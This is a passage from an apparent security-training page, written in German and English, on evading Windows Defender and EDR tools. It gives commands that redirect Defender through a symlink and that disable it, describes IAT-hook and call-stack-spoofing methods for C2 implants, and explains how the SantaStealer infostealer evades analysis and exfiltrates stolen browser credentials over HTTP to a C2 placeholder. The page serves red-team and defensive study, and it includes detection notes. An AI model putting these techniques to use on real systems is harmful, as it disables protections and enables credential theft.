2) Erstelle innerhalb von Platform einen Symlink auf ein Verzeichnis mit höherer Version, der auf deinen Ordner zeigt:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Auswahl des Triggers (Neustart empfohlen):
```cmd
shutdown /r /t 0
```
4) Überprüfe, dass MsMpEng.exe (WinDefend) vom umgeleiteten Pfad ausgeführt wird:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Sie sollten den neuen Prozesspfad unter `C:\TMP\AV\` und die Service-Konfiguration/Registry sehen, die diesen Pfad widerspiegelt.

Post-exploitation options
- DLL sideloading/code execution: Drop/replace DLLs, die Defender aus seinem Anwendungsverzeichnis lädt, um Code in den Prozessen von Defender auszuführen. Siehe den Abschnitt oben: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Entfernen Sie den version-symlink, sodass beim nächsten Start der konfigurierte Pfad nicht aufgelöst wird und Defender nicht startet:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Beachte, dass diese Technik von sich aus keine privilege escalation bietet; sie erfordert admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams können runtime evasion aus dem C2 implant in das Zielmodul selbst verlagern, indem sie dessen Import Address Table (IAT) hooken und ausgewählte APIs durch attacker-controlled, position‑independent code (PIC) routen. Das verallgemeinert die Evasion über die kleine API‑Surface hinaus, die viele kits exposen (z. B. CreateProcessA), und überträgt denselben Schutz auf BOFs und post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). Das PIC muss eigenständig und position‑independent sein.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Wende den Patch nach relocations/ASLR und vor der ersten Verwendung des Imports an. Reflective loaders wie TitanLdr/AceLdr zeigen Hooking während DllMain des geladenen Moduls.
- Halte Wrapper klein und PIC‑safe; löse die echte API über den ursprünglichen IAT‑Wert auf, den du vor dem Patching erfasst hast, oder über LdrGetProcedureAddress.
- Verwende RW → RX‑Übergänge für PIC und vermeide es, writable+executable Seiten zu hinterlassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine gefälschte Aufrufkette (Return‑Adressen in harmlose Module) auf und springen dann in die echte API.
- Das unterläuft Detections, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere das mit stack cutting/stack stitching Techniken, um vor dem API‑Prolog in die erwarteten Frames zu landen.

Operational integration
- Hänge den reflective loader an post‑ex DLLs voran, sodass PIC und Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Verwende ein Aggressor‑Script, um Ziel‑APIs zu registrieren, damit Beacon und BOFs transparent vom selben Evasion‑Pfad profitieren, ohne Codeänderungen.

Detection/DFIR considerations
- IAT integrity: Einträge, die zu non‑image (heap/anon) Adressen auflösen; periodische Überprüfung der Import‑Pointer.
- Stack anomalies: Return‑Adressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu non‑image PIC; inkonsistente RtlUserThreadStart‑Abstammung.
- Loader telemetry: in‑process writes to IAT, frühe DllMain‑Aktivität, die Import‑Thunks modifiziert, unerwartete RX‑Regionen, die beim Laden erstellt werden.
- Image‑load evasion: Beim Hooking von LoadLibrary* überwachen Sie verdächtige Loads von automation/clr assemblies, die mit memory masking Events korreliert sind.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) zeigt, wie moderne info‑stealers AV bypass, anti‑analysis und credential access in einem einzigen Workflow kombinieren.

### Keyboard layout gating & sandbox delay

- Ein Konfig‑Flag (`anti_cis`) enumeriert installierte Tastaturlayouts via `GetKeyboardLayoutList`. Wird ein Cyrillic layout gefunden, legt die Sample einen leeren `CIS`‑Marker ab und terminiert, bevor Stealers ausgeführt werden, sodass sie nie in ausgeschlossenen Regionen detoniert, während ein Hunting‑Artefakt zurückbleibt.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Mehrschichtige `check_antivm`-Logik

- Variante A durchsucht die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollenden Prüfsumme und vergleicht ihn gegen eingebettete blocklists für debuggers/sandboxes; sie wiederholt die Prüfsumme über den Computernamen und überprüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B inspiziert System-Eigenschaften (Prozessanzahl-Floor, jüngste Uptime), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox-Additions zu erkennen, und führt Timing-Checks rund um Sleeps durch, um Single-Stepping zu entdecken. Jeder Treffer bricht vor dem Starten von Modulen ab.

### Dateiloser Helfer + doppelte ChaCha20 reflective loading

- Die primäre DLL/EXE bettet einen Chromium credential helper ein, der entweder auf die Festplatte geschrieben oder manuell im Speicher gemappt wird; im fileless-Modus löst der Helfer Imports/Relocations selbst auf, sodass keine Helfer-Artefakte geschrieben werden.
- Dieser Helfer speichert eine zweite Stufen-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Keys + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (kein `LoadLibrary`) und ruft Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, abgeleitet von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).
- Die ChromElevator-Routinen nutzen direct-syscall reflective process hollowing, um in einen laufenden Chromium-Browser zu injecten, AppBound Encryption-Keys zu erben und Passwörter/Cookies/Kreditkartendaten direkt aus SQLite-Datenbanken zu decrypten, trotz ABE-Härtung.

### Modulare In-Memory-Sammlung & chunked HTTP-Exfil

- `create_memory_based_log` iteriert eine globale `memory_generators`-Function-Pointer-Tabelle und startet einen Thread pro aktiviertem Modul (Telegram, Discord, Steam, screenshots, documents, browser extensions, etc.). Jeder Thread schreibt Ergebnisse in geteilte Puffer und meldet seine Dateianzahl nach einem ~45s Join-Fenster.
- Ist alles fertig, wird alles mit der statisch gelinkten `miniz`-Library als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` schläft dann 15s und streamt das Archiv in 10 MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei ein Browser `multipart/form-data`-Boundary (`----WebKitFormBoundary***`) gefälscht wird. Jeder Chunk fügt `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>` hinzu, und der letzte Chunk hängt `complete: true` an, damit das C2 weiß, dass die Reassemblierung abgeschlossen ist.

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)

{{#include ../banners/hacktricks-training.md}}
